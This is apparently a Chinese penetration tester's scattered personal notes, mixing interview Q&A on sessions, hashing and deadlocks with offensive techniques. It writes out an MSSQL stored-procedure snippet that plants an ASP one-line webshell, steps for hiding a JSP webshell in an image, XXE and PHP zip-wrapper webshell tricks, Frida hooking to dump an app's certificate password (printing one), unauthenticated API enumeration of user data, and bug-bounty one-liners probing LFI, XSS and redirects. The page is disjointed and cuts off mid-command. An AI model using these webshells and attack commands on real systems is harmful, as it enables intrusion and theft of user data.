<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161426063.jpeg" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>下面是方法</p>
<p><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/58916/">https://www.uedbox.com/post/58916/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ch1ngg/CaidaoMitmProxy">https://github.com/Ch1ngg/CaidaoMitmProxy</a></p>
<p>不过这些都是借用。。还是得自己学好java去进行改进</p>
<p>如果是插入图片码的话、在这个过程中也踩了一些坑，有些图片源码包含特殊字符会和木马的源代码发生冲突，因此需要特殊处理过的图片才能保证正常解析。推荐使用如下图片。</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161431794.jpeg" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>使用notepad++打开图片，把jsp马插入到图片源码中。</p>
<p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16735232589041.jpeg" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>更改为jsp后缀进行上传</p>
<p>如果失败 最好在码的前面和后面都插入</p>
<p>解析成功的回显如下:</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161434828.jpeg" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>docx是doc进行xml转置文件  将其后缀改为zip后可以看到很多xml文件</p>
<p>而且可以将xml载入目录&#x2F;etc&#x2F;passwd  或者插入xxe代码  就能实行xxedengdeng</p>
<p>然后还能再写入php木马到zip然后上传  然后再用php伪协议&#x2F;&#x2F;zip将其解压就能获得webshell</p>
<p>php魔方加密 1 2 3</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_35949264/article/details/115147668">https://blog.csdn.net/weixin_35949264/article/details/115147668</a></p>
<p>首先是为什么能成功解析成php文件？</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (test_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wname&quot;</span>])!==<span class="hljs-string">&quot;&quot;</span>)&#123;<span class="hljs-regexp">//</span>自定义文件名<br><br>        <span class="hljs-variable">$newname</span>=test_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wname&quot;</span>]).<span class="hljs-string">&quot;.&quot;</span>.end(<span class="hljs-variable">$uptype</span>); <span class="hljs-regexp">//</span>新的文件名<br></code></pre></td></tr></table></figure>

<p>我觉得这个地方能够上传成功与文件名命名格式有关，众所周知，英文状态下冒号是不允许存在的，应该是这个地方产生了截断，导致后面的<code>.jpg</code>没有被拼接上。</p>
<p><strong>Shiro-721****，对应CVE-2019-12422，影响范围Apache Shiro &lt; 1.4.2</strong>。后期Shiro组件的加密key是系统随机产生的，无法猜到key。但是安全专家很快发现，Shiro的加密方式是AES-128-CBC，CBC加密方式存在一个 Padding Oracle Attack漏洞，可以得到一个存在反序列化数据的AES加密密文，发送给服务端后，shiro组件会解密然后触发反序列化代码执行漏洞。这种攻击方式的前提是需要登录后台获取一个合法Cookie。</p>
<p><strong>一次成功的Shiro Padding Oracle需要一直向服务器不断发包，判断服务器返回，攻击时间通常需要几个小时。</strong>由于此漏洞利用起来耗时时间特别长，很容易被waf封禁，因此在真实的红队项目中，极少有此漏洞的攻击成功案例，大家多数都是在虚拟机环境下测试。</p>
<p>遇到的各种坑的解决方法:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484091&idx=1&sn=4dcce59a842f17035d0018bf650671ae&chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&mpshare=1&scene=23&srcid=042312zNRzQM4ycBAZSa7pUd&sharer_sharetime=1650691567395&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd">https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&amp;mid=2247484091&amp;idx=1&amp;sn=4dcce59a842f17035d0018bf650671ae&amp;chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&amp;mpshare=1&amp;scene=23&amp;srcid=042312zNRzQM4ycBAZSa7pUd&amp;sharer_sharetime=1650691567395&amp;sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd</a></p>
<p>20220421 五号暗区 今日一论：哈希算法和加密算法有什么区别？为什么对口令的保护更多使用哈希算法而不是加密算法？</p>
<p>1 hash不可逆，且长度相等，普通加密可逆，且长度不等<br>2 口令属于的作用在于比较验证，不需要还原成明文，所以使用hash</p>
<p>既然是dbo的权限那么也可以尝试通过差异备份等等的方法来绕过杀毒，这里利用的是存储过程来写文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> intexec sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@o</span> outexec sp_oamethod <span class="hljs-variable">@o</span>, <span class="hljs-string">&#x27;createtextfile&#x27;</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">&#x27;c:\inetpub\muma.asp&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;&lt;%execute(request(&quot;a&quot;))%&gt;&#x27;</span> <br></code></pre></td></tr></table></figure>



<p>利用导入xvg文件进行xxs</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkwNzEzMTg3MQ==&mid=2247485101&idx=1&sn=f1cf5a130a662990e665a796024517ba&chksm=c0dca81df7ab210b442563f85d3f2d12f73c1d9c8e2027705fb7cae88f6a993e6606a308b467&mpshare=1&scene=23&srcid=0425cjVGunK3XgzUbgnMn5l9&sharer_sharetime=1650890307991&sharer_shareid=9108c08c45d1f36cab8f5c866e004fa3#rd">https://mp.weixin.qq.com/s?__biz=MzkwNzEzMTg3MQ==&amp;mid=2247485101&amp;idx=1&amp;sn=f1cf5a130a662990e665a796024517ba&amp;chksm=c0dca81df7ab210b442563f85d3f2d12f73c1d9c8e2027705fb7cae88f6a993e6606a308b467&amp;mpshare=1&amp;scene=23&amp;srcid=0425cjVGunK3XgzUbgnMn5l9&amp;sharer_sharetime=1650890307991&amp;sharer_shareid=9108c08c45d1f36cab8f5c866e004fa3#rd</a></p>
<p>20220425今日一问：Session和Cookie的区别？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs tiddlywiki">1）Cookie：用户登录后，服务端委托浏览器把用户信息存储在cookie中，客户端每次发起请求时要携带这个cookie，服务端收到请求时从cookie中取出用户信息，就知道是哪个用户了。<br>但是服务器无法检测 这个cookie是否被篡改，所以不安全。<br>2）Session：用户登录后将用户信息保存到服务器内存中，并返回一个ssesionid让浏览器设置到cookie中，浏览器之后每次发起请求都会携带cookie，服务端收到后取出cookie中的sessionid，再从内存中取出与之相对应的用户信息，这样就知道是哪个用户了。<br>但是当用户增多时，服务器内存压力会很大。<br>3）Token：用户登录后，服务端会签发一个token发给客户端，客户端收到后爸token放到cookie或LocalStorage（局部存储器），之后每次向服务端请求资源时都要携带token，服务端收到后验证tokne，就知道哪个用户了。token的好处是，可以很方便的拓展，一处发票，处处用票。但是缺点是，不能踢人，发出去了就只能等他票据过期了，还有需要保证密钥足够安全<br><br>服务端可以检测到token是否被篡改，比较安全<br><br>session,记录服务器和客户端会话状态的机制，使服务端可以记录会话信息<br><br>token，访问资源时需要的资源凭证，不会存储会话信息<br><br>cookie，保存在浏览器的个人信息，辨别用户身份，进行session跟踪<br><br>session：服务器给客户端起的别名，用于分辨谁是谁。<br>cookie：只存在于浏览器的特殊容器，用于携带一部分浏览器需要传递给服务器的信息。<br>token：服务器用于证明“我的确给过客户端授权，至于客户端是谁？我不在乎”<br><br><br>token和session最核心的区别是发证和验证的解耦合<br><br></code></pre></td></tr></table></figure>

<p>20220406 每日一问 tcp和http的差别</p>
<p>tcp有状态：每一次的交换数据都和上一次相关，ack确认上次接收的报文<br>http无状态：每次请求都是独立请求，上下没有任何关系，服务器也不记录是不是同一用户</p>
<p>查看目录的时候，发现了网站的报错信息，好熟悉啊，是thinkphp的框架<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204271707630.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>这么说的话，让我再看一看发送的包和返回的包，有了惊喜发现，该网站用的是基于thinkphp框架的thinkcmf框架<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204271707348.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>这里教一些前端看代码的小技巧，第一个是js代码格式化，点击下面这个花括号，就能格式化JS代码比较好看<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292101238.png" srcset="/img/loading.gif" lazyload alt="图片"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292101970.png" srcset="/img/loading.gif" lazyload></p>
<p>第二点就是如何找接口，通过ctrl+F搜索path: ‘，就能看到他的路由配置或者直接搜routes或者home（有没有大佬还有好的方法可以评论区说说）<img src="E:/typora%E5%9B%BE%E7%89%87/640-16735232589052.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>如果发现一个接口是<a target="_blank" rel="noopener" href="https://x.x.com/#/XXXXconferenceRoomList%EF%BC%8C%E6%8B%BC%E6%8E%A5%E7%9B%B4%E6%8E%A5get%E8%AF%B7%E6%B1%82%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%89%8D%E7%AB%AF%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%90%91%E5%90%8E%E7%AB%AF%E5%8F%91%E8%B5%B7%E5%AF%B9%E5%BA%94%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%9F%A5%E8%AF%A2%EF%BC%8C%E6%9B%BF%E6%8D%A2%E9%83%A8%E5%88%86%E5%8F%82%E6%95%B0%E5%8D%B3%E5%8F%AF%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%83%B3%E8%A6%81%E6%9F%A5%E8%AF%A2%E5%88%B0%E4%BF%A1%E6%81%AF%EF%BC%8C%E6%9C%AA%E5%81%9A%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%EF%BC%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E6%8E%A5%E5%8F%A3%E6%9F%A5%E5%88%B0%E4%B8%80%E4%BA%9B%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E4%BA%86">https://X.X.com/#/XXXXconferenceRoomList，拼接直接get请求访问，前端会自动向后端发起对应接口的查询，替换部分参数即可查询到想要查询到信息，未做权限校验，未授权直接调用接口查到一些敏感信息了</a></p>
<p>如果发现一个接口是XXXXAddressBookByProjectId，也是直接泄漏了地址、姓名、电话等敏感信息</p>
<p>如果看到一个很有趣的接口XXXXUserInfo，这明显是一个用户信息的接口，访问后显示系统修复中<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292105913.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>见到这个不要慌，URL后面直接?id&#x3D;1试试-&gt;不行，把数据包改成POST果然可以了，直接可以遍历用户了，接口还返回了用户名和密码，这不就齐活了</p>
<p>总结写在后面，前面也说了找接口用通过ctrl+F搜索path: ‘，就能看到他的路由配置或者直接搜routes或者home，还有就是有的js下面会配置POST包或者GET包参数，&#x3D;&#x3D;如果POST就是data，GET就是params&#x3D;&#x3D;，不像这次这么简单直接访问就把参数补齐了，我只能说细心再细心很重要~，再见各位。</p>
<p>在许多业务非常聚焦比如行业应用、银行、公共交通、游戏等行业，C&#x2F;S架构中服务器高度集中，对应用的版本控制非常严格，这时候就会在服务器上部署对app内置证书的校验代码。</p>
<p>抓包出现如下提示时，我们确定出此APP为服务器校验app客户端证书<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292110187.jpeg" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>对于此类APP抓包而言通常需要完成两项内容：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">找到证书文件<br>找到证书密码<br></code></pre></td></tr></table></figure>

<p>服务器对客户端进行校验过程中，客户端将证书公钥发送给服务器，以及从服务器获取session和私钥解密过程中，需要API进行操作，API存在于java层框架内，所以hook框架层代码<code>java.security.KeyStore</code>，使密码自吐</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"># frida -<span class="hljs-keyword">U</span> -f cn.soulapp.android -<span class="hljs-keyword">l</span> ssl.js  --<span class="hljs-keyword">no</span>-<span class="hljs-keyword">pause</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292112762.jpeg" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>密码}%2R+\OSsjpP!w%X<br>然后首先使用常规方式解压搜索app包里的证书文件。一般apk进行解包，直接过滤搜索后缀名为p12的文件即可，一般常用的命令为tree -NCfhl |grep -i p12，直接打印出p12文件的路径.<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292115305.jpeg" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>更多详见<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247497476&idx=1&sn=d12804a25ba122c1a4e06b28356ba745&chksm=ce5dd565f92a5c73fa027ec96d79469ff4883038da9c7ed4153ccfa289a22ee289da7243b34d&mpshare=1&scene=23&srcid=0427762FTBKHPUG2paGDrEAf&sharer_sharetime=1651060892855&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd">https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247497476&amp;idx=1&amp;sn=d12804a25ba122c1a4e06b28356ba745&amp;chksm=ce5dd565f92a5c73fa027ec96d79469ff4883038da9c7ed4153ccfa289a22ee289da7243b34d&amp;mpshare=1&amp;scene=23&amp;srcid=0427762FTBKHPUG2paGDrEAf&amp;sharer_sharetime=1651060892855&amp;sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd</a></p>
<p>&lt;Frida自吐证书密码&gt;</p>
<p>死锁和堵塞的差别</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">1 死锁的概念解释<br>指多个进程在运行过程中因争夺资源而造成的一种僵局，当进程处于这种僵持状态时，若无外力作用，它们都将无法再向前推进。<br>2 死锁的产生<br><span class="hljs-section">死锁的产生主要有两点:</span><br>资源竞争和进程间推进顺序非法<br><br>阻塞操作是指在执行设备操作时若不能获得资源则挂起进程，直到满足可操作的条件后再进行操作。被挂起的进程进入休眠状态，被从调度器的运行队列移走，直到等待的条件被满足。而非阻塞操作的进程在不能进行设备操作时并不挂起，它或者放弃，或者不停地查询，直至可以进行操作为止<br><br>死锁是多<br>阻塞可单可多<br><br>我的文件助手 0:33:20<br>阻塞在等待资源  期间是挂起的<br>死锁在争夺资源 期间是运行的<br></code></pre></td></tr></table></figure>



<p>在挖洞的时候一些提高效率的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs bash">本节定义了整个单行命令/脚本中使用的特定术语或占位符。<br><br>    1.1. <span class="hljs-string">&quot;HOST &quot;</span>定义了一个主机名、（子）域或IP地址，例如，用internal.host、domain.tld、sub.domain.tld或127.0.0.1取代。<br><br>    1.2. <span class="hljs-string">&quot;HOSTS.txt &quot;</span>包含标准1.1，在文件中超过一个。<br><br>    2.1. <span class="hljs-string">&quot;URL &quot;</span>肯定定义了URL，例如被http://domain.tld/path/page.html，或者有点以HTTP/HTTPS协议开始。<br><br>    2.2. 2.2. <span class="hljs-string">&quot;URLS.txt &quot;</span>包含标准2.1，在文件中不止一个。<br><br>    3.1. <span class="hljs-string">&quot;FILE.txt &quot;</span>或 <span class="hljs-string">&quot;FILE&#123;N&#125;.txt &quot;</span>是指根据上下文和需要运行命令/脚本所需的文件。<br><br>    4.1. <span class="hljs-string">&quot;OUT.txt &quot;</span>或 <span class="hljs-string">&quot;OUT&#123;N&#125;.txt &quot;</span>是指作为目标存储结果的文件将是被执行的命令。<br>    <br>    <br>本地文件包含 @dwisiswant0<br>gau HOST | gf lfi | qsreplace <span class="hljs-string">&quot;/etc/passwd&quot;</span> | xargs -I% -P 25 sh -c <span class="hljs-string">&#x27;curl -s &quot;%&quot; 2&gt;&amp;1 | grep -q &quot;root:x&quot; &amp;&amp; echo &quot;VULN! %&quot;&#x27;</span><br><br>开放式重定向 @dwisiswant0<br><span class="hljs-built_in">export</span> LHOST=<span class="hljs-string">&quot;URL&quot;</span>; gau <span class="hljs-variable">$1</span> | gf redirect | qsreplace <span class="hljs-string">&quot;<span class="hljs-variable">$LHOST</span>&quot;</span> | xargs -I % -P 25 sh -c <span class="hljs-string">&#x27;curl -Is &quot;%&quot; 2&gt;&amp;1 | grep -q &quot;Location: $LHOST&quot; &amp;&amp; echo &quot;VULN! %&quot;&#x27;</span><br><br>@N3T_hunt3r<br><span class="hljs-built_in">cat</span> URLS.txt | gf url | <span class="hljs-built_in">tee</span> url-redirect.txt &amp;&amp; <span class="hljs-built_in">cat</span> url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk &gt; /dev/null<br><br>XSS @cihanmehmet<br>gospider -S URLS.txt -c 10 -d 5 --blacklist <span class="hljs-string">&quot;.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)&quot;</span> --other-source | grep -e <span class="hljs-string">&quot;code-200&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span>| grep <span class="hljs-string">&quot;=&quot;</span> | qsreplace -a | dalfox pipe | <span class="hljs-built_in">tee</span> OUT.txt<br><br>@fanimalikhack<br>waybackurls HOST | gf xss | sed <span class="hljs-string">&#x27;s/=.*/=/&#x27;</span> | <span class="hljs-built_in">sort</span> -u | <span class="hljs-built_in">tee</span> FILE.txt &amp;&amp; <span class="hljs-built_in">cat</span> FILE.txt | dalfox -b YOURS.xss.ht pipe &gt; OUT.txt<br><br>@oliverrickfors<br><span class="hljs-built_in">cat</span> HOSTS.txt | getJS | httpx --match-regex <span class="hljs-string">&quot;addEventListener\((?:&#x27;|\&quot;)message(?:&#x27;|\&quot;)&quot;</span><br>原型链污染@R0X4R<br>subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt &amp;&amp; sed <span class="hljs-string">&#x27;s/$/\/?__proto__[testparam]=exploit\//&#x27;</span> FILE.txt | page-fetch -j <span class="hljs-string">&#x27;window.testparam == &quot;exploit&quot;? &quot;[VULNERABLE]&quot; : &quot;[NOT VULNERABLE]&quot;&#x27;</span> | sed <span class="hljs-string">&quot;s/(//g&quot;</span> | sed <span class="hljs-string">&quot;s/)//g&quot;</span> | sed <span class="hljs-string">&quot;s/JS //g&quot;</span> | grep <span class="hljs-string">&quot;VULNERABLE&quot;</span><br>查找 JavaScript 文件 @D0cK3rG33k<br>assetfinder --subs-only HOST | gau | egrep -v <span class="hljs-string">&#x27;(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)&#x27;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> url; <span class="hljs-keyword">do</span> vars=$(curl -s <span class="hljs-variable">$url</span> | grep -Eo <span class="hljs-string">&quot;var [a-zA-Zo-9_]+&quot;</span> | sed -e <span class="hljs-string">&#x27;s, &#x27;</span>var<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-string">&quot;<span class="hljs-variable">$url</span>&quot;</span>?<span class="hljs-string">&#x27;,g&#x27;</span> -e <span class="hljs-string">&#x27;s/ //g&#x27;</span> | grep -v <span class="hljs-string">&#x27;.js&#x27;</span> | sed <span class="hljs-string">&#x27;s/.*/&amp;=xss/g&#x27;</span>):<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\e[1;33m<span class="hljs-variable">$url</span>\n&quot;</span> <span class="hljs-string">&quot;\e[1;32m<span class="hljs-variable">$vars</span>&quot;</span>; <span class="hljs-keyword">done</span><br><br>从JavaScript中提取端点@renniepak<br><span class="hljs-built_in">cat</span> FILE.js | grep -oh <span class="hljs-string">&quot;\&quot;\/[a-zA-Z0-9_/?=&amp;]*\&quot;&quot;</span> | sed -e <span class="hljs-string">&#x27;s/^&quot;//&#x27;</span> -e <span class="hljs-string">&#x27;s/&quot;$//&#x27;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从目标列表中获取CIDR和组织信息@steve_mcilwain<br><span class="hljs-keyword">for</span> HOST <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> HOSTS.txt);<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> $(<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(dig a <span class="hljs-variable">$HOST</span> +short); <span class="hljs-keyword">do</span> whois <span class="hljs-variable">$ip</span> | grep -e <span class="hljs-string">&quot;CIDR\|Organization&quot;</span> | <span class="hljs-built_in">tr</span> -s <span class="hljs-string">&quot; &quot;</span> | <span class="hljs-built_in">paste</span> - -; d<br>one | <span class="hljs-built_in">uniq</span>); <span class="hljs-keyword">done</span><br><br>从RapidDNS.io获取子域名@andirrahmani1<br>curl -s <span class="hljs-string">&quot;https://rapiddns.io/subdomain/<span class="hljs-variable">$1</span>?full=1#result&quot;</span> | grep <span class="hljs-string">&quot;&lt;td&gt;&lt;a&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;&quot;&#x27;</span> -f 2 | grep http | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;/&#x27;</span> -f3 | sed <span class="hljs-string">&#x27;s/#results//g&#x27;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从BufferOver.run获取子域@_ayoubfathi_<br>curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;,&#x27;</span> -f2 | <span class="hljs-built_in">sort</span> -u<br><br>@AnubhavSingh_<br><span class="hljs-built_in">export</span> domain=<span class="hljs-string">&quot;HOST&quot;</span>; curl <span class="hljs-string">&quot;https://tls.bufferover.run/dns?q=<span class="hljs-variable">$domain</span>&quot;</span> | jq -r .Results<span class="hljs-string">&#x27;[]&#x27;</span> | rev | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;,&#x27;</span> -f1 | rev | <span class="hljs-built_in">sort</span> -u | grep <span class="hljs-string">&quot;\.<span class="hljs-variable">$domain</span>&quot;</span><br><br>从Riddler.io获取子域名@pikpikcu<br>curl -s <span class="hljs-string">&quot;https://riddler.io/search/exportcsv?q=pld:HOST&quot;</span> | grep -Po <span class="hljs-string">&quot;(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>Get Subdomains from VirusTotal@pikpikcu<br>curl -s <span class="hljs-string">&quot;https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40&quot;</span> | grep -Po <span class="hljs-string">&quot;((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>用cyberxplore获取子域名@pikpikcu<br>curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po <span class="hljs-string">&quot;(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> <br><br>从CertSpotter获取子域@caryhooper<br>curl -s <span class="hljs-string">&quot;https://certspotter.com/api/v1/issuances?domain=HOST&amp;include_subdomains=true&amp;expand=dns_names&quot;</span> | jq .[].dns_names | grep -Po <span class="hljs-string">&quot;(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从Archive中获取子域@pikpikcu<br>curl -s <span class="hljs-string">&quot;http://web.archive.org/cdx/search/cdx?url=*.HOST/*&amp;output=text&amp;fl=original&amp;collapse=urlkey&quot;</span> | sed -e <span class="hljs-string">&#x27;s_https*://__&#x27;</span> -e <span class="hljs-string">&quot;s/\/.*//&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从JLDC获取子域@pikpikcu<br>curl -s <span class="hljs-string">&quot;https://jldc.me/anubis/subdomains/HOST&quot;</span> | grep -Po <span class="hljs-string">&quot;((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>从securitytrails获取子域@pikpikcu<br>curl -s <span class="hljs-string">&quot;https://securitytrails.com/list/apex_domain/HOST&quot;</span> | grep -Po <span class="hljs-string">&quot;((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | grep <span class="hljs-string">&quot;.HOST&quot;</span> | <span class="hljs-built_in">sort</span> -u<br><br>Bruteforcing Subdomain using DNS Over@pikpikcu<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> sub; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;https://dns.google.com/resolve?name=<span class="hljs-variable">$sub</span>.HOST&amp;type=A&amp;cd=true&quot;</span> | parallel -j100 -q curl -s -L --silent  | grep -Po <span class="hljs-string">&#x27;[&#123;\[]&#123;1&#125;([,:&#123;&#125;\[\]0-9.\-+Eaeflnr-u \n\r\t]|&quot;.*?&quot;)+[&#125;\]]&#123;1&#125;&#x27;</span> | jq | grep <span class="hljs-string">&quot;name&quot;</span> | grep -Po <span class="hljs-string">&quot;((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+&quot;</span> | grep <span 